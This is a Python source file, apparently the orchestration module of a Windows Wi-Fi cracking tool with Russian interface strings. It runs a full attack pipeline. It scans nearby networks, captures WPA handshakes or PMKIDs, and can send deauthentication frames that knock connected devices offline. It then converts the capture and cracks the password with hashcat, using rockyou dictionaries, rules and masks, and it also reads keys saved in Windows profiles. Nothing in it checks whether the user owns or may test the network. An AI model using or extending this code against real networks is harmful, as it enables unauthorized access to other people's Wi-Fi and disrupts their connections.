"""Orchestrates the full flow: readiness -> scan -> capture -> convert -> crack."""
from __future__ import annotations

import asyncio
import contextlib
import shutil
import tempfile
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Callable, List
from uuid import uuid4

from . import auto, capturer, converter, cracker, deauth, hc22000
from .assets import is_admin
from .capturer import Backend, Interface
from .models import CrackResult, Network
from .options import find_quick_wordlist, find_wordlist
from .scanner import AdapterInfo, ScanError, detect_adapter, scan

PROJECT_ROOT = Path(__file__).resolve().parent.parent
ASSETS_DIR = PROJECT_ROOT / "assets"


class PipelineError(RuntimeError):
    """Raised when a pipeline stage cannot proceed.

    Carries ``remedy`` as well as the message: the UI shows both, and the advice
    depends on which stage failed (missing adapter, missing hashcat, missing
    candidates are three different problems with three different fixes).
    """

    def __init__(self, message: str, remedy: str = "") -> None:
        super().__init__(message)
        self.remedy = remedy


# ---------------------------------------------------------------------------
# readiness
# ---------------------------------------------------------------------------


@dataclass
class Readiness:
    admin: bool = False
    adapter: AdapterInfo | None = None
    hashcat: Path | None = None
    wordlist: Path | None = None
    rules: Path | None = None
    backend: Backend | None = None
    iface: Interface | None = None
    problems: List[str] = field(default_factory=list)
    mask: str | None = None
    capture_problem: str = ""

    @property
    def can_scan(self) -> bool:
        return self.adapter is not None and not self.scan_blocked

    @property
    def can_crack(self) -> bool:
        return bool(self.hashcat and (self.wordlist or self.mask) and self.backend and self.iface
                    and not self.capture_problem)

    @property
    def scan_blocked(self) -> bool:
        return any("геолокац" in p or "местоположен" in p for p in self.problems)


def _find_wordlist() -> Path | None:
    """The main dictionary, or None.

    Delegates to :mod:`wifi_tool.options` so the settings form and the pipeline
    resolve the same set of names: a checklist that says "словарь: найден" and a
    run that then says "Словарь не найден" is the bug this avoids.
    """
    return find_wordlist(ASSETS_DIR)


#: Preferred mutation rule sets, best first. The official hashcat package ships
#: ``best66.rule`` (older builds used ``best64.rule``), so both are probed.
_RULE_NAMES = ("best66.rule", "best64.rule", "rockyou-30000.rule", "d3ad0ne.rule")


def _find_rules(hashcat: Path | None) -> Path | None:
    """Find a mutation rule file next to the app or inside hashcat."""
    bases: list[Path] = [ASSETS_DIR / "rules", ASSETS_DIR]
    if hashcat:
        bases.append(Path(hashcat).parent / "rules")
    for base in bases:
        for name in _RULE_NAMES:
            candidate = base / name
            if candidate.exists():
                return candidate
    # Fall back to any rule file hashcat ships.
    if hashcat:
        found = sorted((Path(hashcat).parent / "rules").glob("*.rule"))
        if found:
            return found[0]
    return None


#: Interface names that belong to a wireless adapter (RU + EN).
_WIRELESS_NEEDLES = ("wi-fi", "wifi", "wlan", "беспровод", "wireless")


def _find_wireless_iface(
    adapter: AdapterInfo | None = None,
    backend: Backend | None = None,
    problems: List[str] | None = None,
) -> Interface | None:
    """The wireless adapter to capture on -- the one that can actually do it.

    Not the first one netsh lists. A machine with a USB stick plugged in has two
    wireless adapters, and the built-in one is usually listed first, and its
    driver has no monitor mode at all. Taking the first produced the worst
    combination available: the program reports «драйвер не поддерживает режим
    монитора» about a laptop that has a capable adapter sitting right next to
    it, and the stick -- which is the one doing the capturing, and doing it fine
    -- is never opened. The user's stick and the program's idea of the stick
    were two different objects, and only one of them was real.

    So the choice is by capability: every wireless interface is asked whether it
    can be captured on, and the first one that can is taken. The detected
    adapter is still preferred over the others, so a machine with two good
    adapters keeps behaving the way it did.

    When nothing can be captured on, the first candidate is returned anyway so
    that :func:`check_readiness` has something to explain rather than only a
    missing adapter.
    """
    ifaces = capturer.list_interfaces()
    detected = next((iface for iface in ifaces if adapter and adapter.name
                     and iface.name.casefold() == adapter.name.casefold()), None)
    wireless = [iface for iface in ifaces
                if any(needle in iface.name.lower() for needle in _WIRELESS_NEEDLES)]
    if detected is not None and detected not in wireless:
        # netsh itself says this one is wireless; its name just does not look
        # like it ("Мой переименованный адаптер", "TP-Link_2.4"). Dropping it on
        # the name alone would lose the only adapter that can be captured on.
        wireless.insert(0, detected)
    if not wireless:
        return None
    order = ([detected] if detected is not None else []) + [
        iface for iface in wireless if iface is not detected
    ]
    if backend is None:
        return order[0]

    first: Interface | None = None
    refusal = ""
    for iface in order:
        try:
            resolved = capturer.resolve_interface(backend, iface)
        except capturer.CaptureError as exc:
            # Npcap does not see this one; another may be visible.
            refusal = f"Интерфейс захвата: {exc}"
            continue
        if first is None:
            first = resolved
        if capturer.monitor_capable(backend, resolved):
            return resolved
    if first is None and refusal and problems is not None:
        # Every candidate was rejected. Saying so beats the bare "no interface
        # found", which points at a machine with nothing wrong with it.
        problems.append(refusal)
    return first


def check_readiness() -> Readiness:
    """Probe everything the pipeline needs and report what is missing."""
    r = Readiness()
    r.admin = is_admin()
    r.adapter = detect_adapter()
    if r.adapter is None:
        # A monitor-mode adapter does not always enumerate as a wireless
        # interface, and readiness would then report «Wi-Fi адаптер не найден»
        # about a stick that is plugged in and working -- with the one fix that
        # actually helps (unplug it) being the one thing the user would rather
        # avoid. Return it to managed mode and look once more before saying so.
        capturer.restore_managed_mode()
        r.adapter = detect_adapter()
    r.hashcat = cracker.find_hashcat()
    r.wordlist = _find_wordlist()
    r.rules = _find_rules(r.hashcat)
    r.backend = capturer.first_available_backend()
    # Picks the adapter that can be captured on, not the one netsh lists first,
    # and comes back with the Npcap device id already resolved.
    r.iface = _find_wireless_iface(r.adapter, r.backend, r.problems)
    if r.backend and r.iface:
        try:
            capturer.check_monitor_support(r.backend, r.iface)
        except capturer.CaptureError as exc:
            r.capture_problem = str(exc)
            r.problems.append(r.capture_problem)

    if not r.admin:
        r.problems.append(
            "Приложение запущено без прав администратора — захват невозможен."
        )
    if r.adapter is None:
        r.problems.append("Wi-Fi адаптер не найден.")
    if r.hashcat is None:
        r.problems.append(
            "Не найден hashcat. Положи hashcat.exe в папку assets/ или в PATH."
        )
    if r.wordlist is None:
        r.problems.append(
            "Не найден словарь. Положи rockyou.txt (или wordlist.txt) в папку assets/."
        )
    if r.backend is None:
        r.problems.append("Не найден инструмент захвата (cap80211 или tshark).")
    if r.iface is None:
        r.problems.append("Не найден сетевой интерфейс для захвата.")
    return r


#: Temporary files this run created. Every capture and every converted hash file
#: lands in the temp directory under a unique name, so without this a session
#: that checks a dozen networks leaves a dozen pcapng files and hash files
#: behind in %TEMP% with nothing referring to them.
_temp_files: "set[Path]" = set()


def _new_capture_file(network: Network) -> Path:
    """A fresh path for this run's capture, inside the program's own folder.

    It used to be ``%TEMP%/wifi_tool_<hex>.pcapng``. That is wrong for a file
    the user is meant to keep: Windows clears the temp directory on its own
    schedule, so a capture that worked -- and the handshake inside it -- can be
    gone by the next morning, with nothing to say it ever existed. A capture also
    has a name worth having: the network and the time it was taken.
    """
    from .options import ensure_captures_dir

    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    ssid = "".join(ch if ch.isalnum() or ch in "-_" else "_"
                   for ch in (network.ssid or "network"))[:32]
    return ensure_captures_dir() / f"{ssid}-{stamp}.pcapng"


def _forget_temp(path: Path) -> None:
    _temp_files.add(Path(path))


def cleanup_temp() -> None:
    """Delete the intermediate files this process created.

    The capture in ``captures/`` is deliberately *not* in here any more. It used
    to be registered like the hash file, which meant a run that succeeded threw
    away the only copy of the handshake on the way out -- so a capture that took
    a minute of waiting could not be kept for a second attempt or sent to
    anyone. Hash files are regenerable from the capture; the capture is not.
    """
    for path in list(_temp_files):
        with contextlib.suppress(OSError):
            Path(path).unlink(missing_ok=True)
        _temp_files.discard(path)


# ---------------------------------------------------------------------------
# stages
# ---------------------------------------------------------------------------


async def scan_networks(
    on_log: Callable[[str], None] | None = None, timeout: float = 20.0
) -> List[Network]:
    """Scan for networks, off the event loop.

    An empty result is checked once against a likelier explanation before it is
    reported as "nothing is around". An adapter left in monitor mode by a capture
    cannot scan at all -- ``netsh wlan show networks`` returns no networks and no
    error -- which is indistinguishable, from the outside, from an empty room,
    and has the opposite fix: one command instead of unplugging the stick.
    """
    if on_log:
        on_log("Сканирую эфир (netsh wlan show networks mode=bssid)...")
    try:
        nets = await asyncio.to_thread(scan, timeout)
    except ScanError as exc:
        raise PipelineError(str(exc)) from exc
    if not nets:
        note = await asyncio.to_thread(capturer.restore_managed_mode)
        if note and on_log:
            on_log(note)
        if on_log:
            on_log("Список пуст — проверяю режим адаптера и повторяю скан.")
        try:
            nets = await asyncio.to_thread(scan, timeout)
        except ScanError as exc:
            raise PipelineError(str(exc)) from exc
    if on_log:
        on_log(f"Найдено сетей: {len(nets)}")
    return nets


async def convert_capture(
    capture_path: str | Path,
    bssid: str | None = None,
    on_log: Callable[[str], None] | None = None,
    *,
    should_stop: Callable[[], bool] | None = None,
    essid: str = "",
) -> tuple[Path, hc22000.ConversionReport]:
    """Convert a capture file into an hc22000 hash file.

    Uses wpawolf when installed, otherwise the built-in Python converter.

    ``essid`` is the network's name as the scan reported it, used in two places
    and for two different reasons. As a hint: a short capture can hold the
    handshake and no beacon, and a record without an ESSID cannot be checked
    against any password by hashcat however long the run. As a filter: a
    handshake with a neighbouring access point of the same network -- the other
    band of the same router -- carries the very same WPA key, because the key is
    derived from the name, not from the radio. Accepting those too turns "the
    capture held a handshake and the run said no" into a crack.
    """
    out_path = Path(tempfile.gettempdir()) / f"wifi_tool_{uuid4().hex}.hc22000"
    _forget_temp(out_path)
    backend = converter.preferred_backend()
    if on_log:
        names = {"wpawolf": "wpawolf", "builtin": "встроенный конвертер"}
        on_log(f"Конвертирую {capture_path.name} ({names[backend]})...")
    try:
        result = await converter.convert(capture_path, out_path, bssid, on_log=on_log,
                                          should_stop=should_stop, essid_hint=essid,
                                          essid=essid or None)
    except converter.ConversionError as exc:
        raise PipelineError(str(exc)) from exc
    if on_log:
        on_log(f"Конвертация: {hc22000.summarise(result.report)}")
    return result.path, result.report


@dataclass
class Callbacks:
    """Progress sink for one run.

    ``on_capture(seconds_left, bytes_written)`` is what makes the capture stage
    legible. The stage between "pressing Enter" and "hashcat starts" is up to a
    minute of writing to a file, and with nothing to show, a screen that says
    «Захват PMKID / рукопожатия» looks identical to a hang.
    """
    on_phase: Callable[[str], None] | None = None
    on_log: Callable[[str], None] | None = None
    on_status: Callable[[cracker.HashStatus], None] | None = None
    should_stop: Callable[[], bool] | None = None
    #: ``(index, total, stage_title)`` for the automatic ladder, so the UI can
    #: say which attempt is running instead of only "подбор пароля".
    on_stage: Callable[[int, int, str], None] | None = None
    #: ``(seconds_left, bytes_written)`` while the capture stage is writing.
    on_capture: Callable[[int, int], None] | None = None
    #: The conversion report, once a capture has been read. Carries the count of
    #: EAPOL handshakes and PMKIDs actually found, which is the difference between
    #: "wrote a file" and "got something worth checking passwords against".
    on_capture_result: Callable[["hc22000.ConversionReport"], None] | None = None

    def phase(self, name: str) -> None:
        if self.on_phase:
            self.on_phase(name)

    def log(self, line: str) -> None:
        if self.on_log:
            self.on_log(line)

    def capture(self, seconds_left: int, size: int) -> None:
        if self.on_capture:
            self.on_capture(seconds_left, size)


#: Default wall-clock budget for :func:`auto_attack`: enough to sweep the
#: generated candidates, both dictionaries and most of the mutation stage.
AUTO_RUNTIME = 1800

#: How long a capture listens before giving up, in seconds.
#:
#: This is a ceiling, not a schedule: :func:`obtain_hashes` passes a verifier, so
#: a capture ends the moment it holds a handshake worth having, and a long limit
#: costs nothing when the handshake is quick. What it buys is the other case --
#: the one that made this the most common way a run ended, with a 4 MB file
#: containing no handshake and no way to tell whether one more minute would have
#: helped. Ninety seconds covers an idle room; it does not cover a phone that
#: reassociates when it walks back into range, a laptop that was asleep, or a
#: neighbour who simply did not use the network that evening.
CAPTURE_SECONDS = 300


@contextlib.asynccontextmanager
async def _kicking(iface, network: Network, *, enabled: bool, probe: str,
                   log: Callable[[str], None]):
    """Kick the network while the capture listens, if the user asked for it.

    Yields an object with ``report()``, which says once at the end how many
    frames went out or why none did. Kept as a context manager so the kicker
    cannot outlive the capture it was started for: a deauthentication burst is
    useful while somebody is listening for the reaction, and after the capture
    is over it is just a network being knocked offline for nothing.

    ``probe`` is the readiness answer, already asked before the capture started.
    An empty one is a promise that injection can work; anything else means the
    kicker is skipped and the capture stays passive -- reported, not raised,
    because the capture is the thing that matters and a network that refuses to
    be kicked is still a network worth listening to. That refusal is also what
    a 802.11w-protected network looks like, and there the honest answer is "this
    will not work" rather than a crash.

    The kicker is started by ``start()``, which the capture calls once the
    adapter is on the target's channel -- not here, before it. Frames sent on the
    wrong channel knock nobody over, and the run would then look exactly like a
    passive capture that got unlucky.
    """
    state: dict[str, object] = {"frames": 0, "note": probe}
    stop = threading.Event()
    gate: asyncio.Future | None = None

    class Report:
        def start(self) -> None:
            """Let the frames go. Called by the capture once the radio is tuned."""
            if gate is not None and not gate.done():
                gate.set_result(None)

        def report(self) -> None:
            if state["note"]:
                log(f"[деаут] не сработало: {state['note']}")
            elif int(state["frames"]):  # type: ignore[arg-type]
                log(f"[деаут] отправлено кадров: {state['frames']}")

    if not enabled or not network.bssid or probe:
        yield Report()
        return

    log("[деаут] устройства в сети отвалятся на несколько секунд — "
        "жду рукопожатие в захвате")
    gate = asyncio.get_running_loop().create_future()

    async def drive() -> None:
        await gate
        try:
            frames, note = await asyncio.to_thread(deauth.run, iface, network.bssid,
                                                   stop=stop)
        except Exception as exc:  # noqa: BLE001 -- never take the capture down
            frames, note = 0, f"{exc}"
        state["frames"], state["note"] = frames, note

    task = asyncio.create_task(drive())
    try:
        yield Report()
    finally:
        stop.set()
        if gate is not None and not gate.done():  # capture ended before the retune
            gate.set_result(None)
        task.cancel()
        with contextlib.suppress(asyncio.CancelledError, Exception):
            await task
        # The capture hands the adapter back to managed mode on its way out, and
        # this runs after that: a kicker still holding the radio would keep it
        # in monitor mode for the next run to trip over.
        with contextlib.suppress(Exception):
            await asyncio.to_thread(capturer.restore_managed_mode, iface)


def _handshake_verifier(network: Network) -> Callable[[Path], bool]:
    """The predicate that ends a capture as soon as it has what it needs.

    It is not "did an EAPOL frame arrive" but "does this file now convert into a
    record for *this* network". The gap between the two is the whole reason the
    capture has to think: a lone message 1, a neighbour's handshake, or a pair
    that never got its third message all look like handshake traffic on the air
    and all convert to nothing hashcat can check. Conversion is pure-Python over
    the whole capture, so it runs off the event loop and only when new EAPOL
    traffic has actually turned up.
    """
    bssid = network.bssid or None
    essid = network.ssid or ""

    def verify(path: Path) -> bool:
        try:
            report = hc22000.convert(path, bssid_filter=bssid, essid_hint=essid,
                                     essid_filter=essid or None)
        except (hc22000.CaptureFormatError, OSError, ValueError):
            # A file the backend is still writing can be cut mid-frame, and the
            # BSSID is a scan's word for it, not a capture's. Neither is a
            # reason to stop; both are a reason to keep listening.
            return False
        return report.ok

    return verify


async def obtain_hashes(
    network: Network,
    r: Readiness,
    *,
    capture_seconds: int = CAPTURE_SECONDS,
    capture_path: str | Path | None = None,
    hash_path: str | Path | None = None,
    report: hc22000.ConversionReport | None = None,
    deauth: bool = False,
    cb: Callbacks | None = None,
) -> tuple[Path, hc22000.ConversionReport]:
    """Get a crackable hc22000 file for ``network``, capturing it if needed.

    Both entry points go through here -- :func:`attack` for a single configured
    run and :func:`auto_attack` for the ladder -- so the capture stage cannot
    drift between them. A hash file already produced by the caller is passed
    straight back and never converted twice.
    """
    cb = cb or Callbacks()
    if hash_path is not None and report is not None:
        cb.phase("crack")
        return Path(hash_path), report

    # --- stage 1: capture ------------------------------------------------
    cb.phase("capture")
    cb.log(f"Цель: {network.label}  ({network.bssid})")

    if capture_path:
        source = Path(capture_path)
        cb.log(f"Использую готовый файл захвата: {source.name}")
    else:
        if r.capture_problem:
            raise PipelineError(r.capture_problem, _CAPTURE_BLOCKED_REMEDY)
        if r.backend is None or r.iface is None:
            raise PipelineError(
                "Нет инструмента захвата.\n\n" + capturer.setup_hint(),
                _CAPTURE_BLOCKED_REMEDY,
            )
        cb.log(
            f"Инструмент: {r.backend.title}  интерфейс #{r.iface.index} ({r.iface.name})"
        )
        source = _new_capture_file(network)
        # The radio is shared: the kicker sends and the capture listens on the
        # same adapter, so the retune that puts it on the target's channel has to
        # happen before either of them is useful.
        probe = await asyncio.to_thread(deauth.probe, r.iface) if deauth else ""
        if probe:
            cb.log(f"[деаут] недоступно: {probe} — захват останется пассивным")
        cb.log(
            f"Захват рукопожатия/PMKID, до {auto.fmt_budget(capture_seconds)} "
            "(остановлюсь, как только поймаю)..."
        )
        try:
            async with _kicking(r.iface, network, enabled=deauth, probe=probe,
                                log=cb.log) as kicked:
                await capturer.capture(
                    r.backend,
                    r.iface,
                    source,
                    duration=capture_seconds,
                    bssid=network.bssid,
                    channel=network.channel or None,
                    on_log=cb.log,
                    should_stop=cb.should_stop,
                    on_progress=cb.capture,
                    verify=_handshake_verifier(network),
                    kick=kicked.start,
                )
                kicked.report()
        except capturer.CaptureError as exc:
            raise PipelineError(str(exc)) from exc

    # --- stage 2: convert ------------------------------------------------
    # Clear the countdown *before* converting: the file is written by now, and
    # leaving a "0 с осталось" on screen during a conversion that takes seconds
    # reads as a second capture that has stalled.
    cb.capture(0, source.stat().st_size if source.exists() else 0)
    cb.phase("convert")
    hash_path, report = await convert_capture(source, network.bssid or None, cb.log,
                                              should_stop=cb.should_stop,
                                              essid=network.ssid)
    # What the capture actually yielded, reported where the user can act on it.
    if cb.on_capture_result:
        cb.on_capture_result(report)
    return hash_path, report


def _no_hash_error(report: hc22000.ConversionReport) -> str:
    if report.truncated:
        return (
            "Файл захвата не дописан до конца.\n\n"
            + hc22000.summarise(report)
            + "\n\n"
            + "Инструмент захвата был прерван вместо того, чтобы завершиться сам. "
            "Повтори захват и не нажимай Esc: файлы закрываются только при штатном "
            "завершении."
        )
    return (
        "Хэш не получен.\n\n"
        "Возможные причины:\n"
        "  • точка доступа не отдаёт PMKID и не было рукопожатия;\n"
        "  • клиент не переподключался во время захвата — запусти захват заново "
        "и\n    прямо во время него переподключи телефон или ноутбук к этой сети;\n"
        "  • драйвер адаптера не поддерживает режим монитора.\n\n"
        + hc22000.summarise(report)
        + "\n\n"
        + converter.setup_hint()
    )


#: What to suggest for each way the run can come up empty. Sending someone to
#: rewrite a dictionary when the adapter cannot capture 802.11 wastes their
#: afternoon, so each failure names the thing that actually has to change.
_NO_HASH_REMEDY = (
    "Нужен адаптер с режимом монитора (Alfa AW036ACH, MT7612U) либо готовый "
    "файл захвата этой сети — действие «Файл захвата» на этом экране "
    "выбирает .pcapng и сразу запускает проверку."
)
_NO_DICTIONARY_REMEDY = (
    "Нужен hashcat.exe в assets/ (экран настройки, клавиша D) или любой "
    "готовый список кандидатов."
)
_CAPTURE_BLOCKED_REMEDY = (
    "Этот адаптер не умеет режим монитора, а без него нечего проверять. "
    "Подойдёт USB-адаптер с monitor-режимом — либо готовый файл захвата: "
    "действие «Файл захвата» на этом экране выбирает .pcapng и сразу "
    "запускает проверку."
)


async def attack(
    network: Network,
    *,
    readiness: Readiness | None = None,
    capture_seconds: int = CAPTURE_SECONDS,
    deauth: bool = False,
    wordlist: str | Path | None = None,
    rules: str | Path | None = None,
    capture_path: str | Path | None = None,
    hash_path: str | Path | None = None,
    report: hc22000.ConversionReport | None = None,
    hashcat_path: str | Path | None = None,
    mask: str | None = None,
    timeout: float = 600,
    use_rules: bool = True,
    cb: Callbacks | None = None,
) -> CrackResult:
    """Run the full pipeline against ``network`` and return the outcome.

    ``capture_path`` skips live capture and reuses an existing capture file.
    ``hash_path``/``report`` skip conversion entirely when the caller has already
    produced a hash file (offline mode), so it is never done twice.
    """
    cb = cb or Callbacks()
    r = readiness or check_readiness()
    started = time.monotonic()

    wl = None if mask is not None else (Path(wordlist) if wordlist else r.wordlist)
    hc = Path(hashcat_path) if hashcat_path else r.hashcat
    ru = None if mask is not None or not use_rules else (Path(rules) if rules else r.rules)

    if mask is None and (wl is None or not wl.is_file()):
        raise PipelineError(
            "Словарь не найден (assets/rockyou.txt).", _NO_DICTIONARY_REMEDY
        )
    if hc is None or not hc.exists():
        raise PipelineError(
            "hashcat не найден (assets/hashcat.exe).", _NO_DICTIONARY_REMEDY
        )

    hash_path, report = await obtain_hashes(
        network,
        r,
        capture_seconds=capture_seconds,
        deauth=deauth,
        capture_path=capture_path,
        hash_path=hash_path,
        report=report,
        cb=cb,
    )
    assert report is not None

    if not report.ok:
        cleanup_temp()
        raise PipelineError(_no_hash_error(report), _NO_HASH_REMEDY)

    # --- stage 3: crack -----------------------------------------------------
    cb.phase("crack")
    method = "PMKID" if report.pmkid and not report.eapol else "EAPOL handshake"
    cb.log(f"Найдено: {len(report.pmkid)} PMKID, {len(report.eapol)} EAPOL ({method})")
    if mask is not None:
        cb.log(f"Маска: {mask}")
    else:
        cb.log(f"Словарь: {wl.name}" + (f"  правила: {ru.name}" if ru else ""))
    cb.log(f"Лимит подбора: {timeout:g} с")

    try:
        outcome = await cracker.crack(
            hash_path,
            wl,
            ru,
            hashcat=hc,
            on_status=cb.on_status,
            on_log=cb.log,
            should_stop=cb.should_stop,
            mask=mask,
            timeout=timeout,
        )
    except cracker.HashcatError as exc:
        cleanup_temp()
        raise PipelineError(str(exc)) from exc
    finally:
        cleanup_temp()

    error = ""
    if not outcome.cracked:
        if outcome.timed_out:
            error = "Достигнут лимит времени; пароль пока не найден."
        elif outcome.cancelled:
            error = "Подбор отменён."
        else:
            error = "Пароль не найден среди проверенных кандидатов."
    return CrackResult(
        network=network,
        password=outcome.password,
        success=outcome.cracked,
        method=method,
        elapsed=time.monotonic() - started,
        error=error,
        log=list(outcome.log),
    )


# ---------------------------------------------------------------------------
# one-key ladder
# ---------------------------------------------------------------------------


def _quick_wordlist() -> Path | None:
    """The small high-yield list, if it is on disk."""
    return find_quick_wordlist(ASSETS_DIR)


async def saved_key_for(network: Network) -> str:
    """The key Windows already stores for this SSID, or "".

    Checked before anything else because it is the only step that does not
    depend on a guess being right: if this machine has ever joined the network,
    the answer is already on disk and no capture or dictionary is involved.

    Skipped entirely when :data:`wifi_tool.profiles.HISTORY_ENABLED` is off --
    that is the difference between auditing a network and recalling one this
    machine was already in.
    """
    from . import profiles as profiles_mod

    if not profiles_mod.HISTORY_ENABLED or not network.ssid:
        return ""
    try:
        return await asyncio.to_thread(profiles_mod.find_key, network.ssid)
    except profiles_mod.ProfileError:
        # netsh refused or the profile list is unreadable -- treat it as "no
        # stored key" and let the ladder carry on.
        return ""


def _verify_stored(password: str, report: hc22000.ConversionReport | None) -> bool | None:
    """True/False when the handshake can settle it, None when it cannot.

    ``None`` means "nothing to check against" -- no capture, or a converter that
    read the file itself and reported no messages. That is different from
    "checked and wrong", and the difference matters: without it every offline run
    would start by declaring the profile key stale on the strength of no evidence.
    """
    if report is None or not getattr(report, "checks", None):
        return None
    from . import hc22000 as _hc

    return any(_hc.verify_password(password, check) for check in report.checks)


async def auto_attack(
    network: Network,
    *,
    readiness: Readiness | None = None,
    readiness_factory: Callable[[], Readiness] | None = None,
    capture_seconds: int = CAPTURE_SECONDS,
    deauth: bool = False,
    capture_path: str | Path | None = None,
    hash_path: str | Path | None = None,
    report: hc22000.ConversionReport | None = None,
    hashcat_path: str | Path | None = None,
    wordlist: str | Path | None = None,
    rules: str | Path | None = None,
    total_runtime: float = AUTO_RUNTIME,
    mask: str | None = None,
    cb: Callbacks | None = None,
) -> CrackResult:
    """Recover ``network``'s password with no further questions asked.

    Runs every route in the order that actually succeeds on real hardware --
    Windows' stored key, then the capture, then the :mod:`wifi_tool.auto`
    ladder -- and stops at the first success. Nothing here raises for "not
    found": an exhausted ladder is a normal result, not an error, so the caller
    can show it without special-casing a failure.

    ``mask`` is honoured as the first stage of the ladder. Ignoring it here
    would mean Enter on a network silently ran the generic dictionaries instead
    of the format the user typed, which is the difference between finishing in
    seconds and not finishing at all.
    """
    cb = cb or Callbacks()
    started = time.monotonic()

    # 1. The stored key. Instant, deterministic, needs no capture hardware --
    # and skipped outright, phase included, when the connection history is
    # switched off. A checklist that lists a stage the run does not take would
    # be the program claiming it read a profile it deliberately did not read.
    from . import profiles as profiles_mod

    stored = ""
    if profiles_mod.HISTORY_ENABLED:
        cb.phase("saved")
        stored = await saved_key_for(network)
    if stored:
        # A profile key is a claim, not a proof. It is the right answer whenever
        # this machine is the one that joined the network, and it is also exactly
        # what is left behind when the password was changed and nobody cleaned
        # up -- and it used to be returned unchecked, so a stale key ended the
        # run as a success and the cracker was never started at all. With a
        # capture in hand the MIC settles it: the frame already carries a MAC
        # over the derived key, so a match is proof and a mismatch is proof too.
        checked = _verify_stored(stored, report)
        if checked is False:
            cb.log(f"Ключ в профиле Windows устарел — проверка MIC не прошла, иду в подбор")
        elif checked:
            cb.log(f"Ключ профиля Windows подтверждён рукопожатием")
            return CrackResult(
                network=network,
                password=stored,
                success=True,
                method="ключ Windows",
                elapsed=time.monotonic() - started,
                log=[f"ключ прочитан из сохранённого профиля «{network.ssid}» "
                     f"и подтверждён MIC рукопожатия"],
            )
        else:
            return CrackResult(
                network=network,
                password=stored,
                success=True,
                method="ключ Windows",
                elapsed=time.monotonic() - started,
                log=[f"ключ прочитан из сохранённого профиля «{network.ssid}»"],
            )
    cb.log("В сохранённых профилях этого компьютера ключа нет")

    # A saved Windows profile is the only way to recover a WPA3-only/WEP key
    # here. Check that first; without a stored key, don't probe capture tools
    # or imply that an offline attack can work for an unsupported scheme.
    if not network.crackable:
        if network.is_open:
            message = "Сеть открытая: пароль для подключения не требуется."
        elif network.is_wpa3_only:
            message = (
                f"В профилях Windows не найден ключ сети «{network.label}». "
                "Для WPA3-only пароль нельзя проверить офлайн по имени или BSSID."
            )
        else:
            message = (
                f"В профилях Windows не найден ключ сети «{network.label}». "
                "Для этой схемы офлайн-подбор в программе недоступен."
            )
        raise PipelineError(
            message,
            "Если это ваша сеть, проверьте сохранённый профиль Windows или пароль в настройках роутера.",
        )

    # Readiness is only needed after the local-profile route failed. A missing
    # monitor driver must never prevent checking a key Windows already has.
    r = readiness or (readiness_factory() if readiness_factory else check_readiness())

    hc = Path(hashcat_path) if hashcat_path else r.hashcat
    if hc is None or not hc.exists():
        raise PipelineError(
            "hashcat не найден. Положи hashcat.exe в assets/ "
            "(экран НАСТРОЙКА, клавиша D) или запусти с готовым файлом захвата.",
            _NO_DICTIONARY_REMEDY,
        )

    # 2. The capture. Only now, because it is the only step that can fail
    #    outright -- and if it does, the stored-key answer above is still the
    #    right thing to have tried first.
    hash_path, report = await obtain_hashes(
        network,
        r,
        capture_seconds=capture_seconds,
        deauth=deauth,
        capture_path=capture_path,
        hash_path=hash_path,
        report=report,
        cb=cb,
    )
    assert report is not None
    if not report.ok:
        cleanup_temp()
        raise PipelineError(_no_hash_error(report), _NO_HASH_REMEDY)

    method = "PMKID" if report.pmkid and not report.eapol else "EAPOL handshake"
    cb.log(f"Найдено: {len(report.pmkid)} PMKID, {len(report.eapol)} EAPOL ({method})")
    if mask:
        cb.log(f"Маска (первым этапом): {mask}")

    # 3. The ladder.
    workdir = Path(tempfile.gettempdir()) / f"wifi_tool_auto_{uuid4().hex}"
    targeted_path, targeted_count = auto.write_candidates(network, workdir / "targeted.txt")
    stages = auto.build_ladder(
        targeted=targeted_path,
        targeted_count=targeted_count,
        quick=_quick_wordlist(),
        rockyou=Path(wordlist) if wordlist else r.wordlist,
        rules=Path(rules) if rules else r.rules,
        masks=(mask,) if mask else (),
    )
    if not stages:
        raise PipelineError(
            "Не задано ни одного кандидата: нужна маска или список (assets/*.txt).",
            _NO_DICTIONARY_REMEDY,
        )
    rate = auto.Rate()
    cb.phase("crack")
    cb.log(
        f"План: {len(stages)} этапов, {auto.fmt_budget(total_runtime)} — Esc останавливает"
    )
    for index, (stage, share) in enumerate(
        zip(stages, auto.budget_shares(stages, total_runtime, rate)), start=1
    ):
        cb.log(
            f"  {index}. {stage.title} — {auto.fmt_count(stage.candidates())} кандидатов "
            f"(~{share:.0f} с)"
        )

    def speed_logger(line: str) -> None:
        measured = auto.parse_speed(line)
        if measured:
            rate.hps = measured
        cb.log(line)

    async def run_stage(stage: auto.Stage, share: float) -> cracker.CrackOutcome:
        return await cracker.crack(
            hash_path,
            stage.wordlist,
            stage.rules,
            hashcat=hc,
            on_status=cb.on_status,
            on_log=speed_logger,
            should_stop=cb.should_stop,
            mask=stage.mask,
            timeout=share,
        )

    try:
        def announce(index: int, stage: auto.Stage, share: float) -> None:
            if cb.on_stage is not None:
                cb.on_stage(index, len(stages), stage.title)
            cb.log(f"Этап {index + 1}/{len(stages)}: {stage.title}  ({share:.0f} с)")

        outcome, winner = await auto.run_ladder(
            stages,
            run_stage,
            total_runtime=total_runtime,
            rate=rate,
            on_stage=announce,
            should_stop=cb.should_stop,
        )
    except cracker.HashcatError as exc:
        raise PipelineError(str(exc)) from exc
    finally:
        # The candidate list and its folder: hashcat is done with both.
        shutil.rmtree(workdir, ignore_errors=True)
        cleanup_temp()

    error = ""
    remedy = ""
    if outcome is None or not outcome.cracked:
        if cb.should_stop is not None and cb.should_stop():
            error = "Подбор остановлен."
            remedy = "План не израсходован полностью — Enter запустит его заново."
        else:
            error = (
                "Ни один кандидат не подошёл. Пароль не в словарях и не в "
                "форматах, которые перебирает автоматический режим "
                "(цифры 8–9 символов)."
            )
            remedy = (
                "Расширь охват: свой словарь через F1 -> «Параметры», маска с известным "
                "форматом, или больше времени. Случайные 16-символьные пароли "
                "ни одним из этих способов не находятся — для них нужен другой "
                "подход, а не ещё словарь."
            )
    return CrackResult(
        network=network,
        password=outcome.password if outcome is not None else "",
        success=bool(outcome is not None and outcome.cracked),
        method=f"{method} · {winner.title}" if winner is not None else method,
        elapsed=time.monotonic() - started,
        error=error,
        remedy=remedy,
        log=list(outcome.log) if outcome is not None else [],
    )
